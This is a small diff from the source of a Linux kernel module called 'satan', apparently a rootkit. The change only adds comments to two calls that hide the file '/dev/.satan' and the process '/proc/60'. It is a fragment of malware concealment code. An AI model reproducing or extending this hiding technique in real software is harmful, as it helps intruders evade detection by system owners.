@@ -17,8 +17,8 @@ static int __init satan_init(void)
         satan_syscall_init();
         satan_file_init();
 
-        satan_file_hide("/dev/.satan");
-        satan_file_hide("/proc/60");
+        satan_file_hide("/dev/.satan");  // hide file
+        satan_file_hide("/proc/60");  // hide process
 
         return 0;
 }
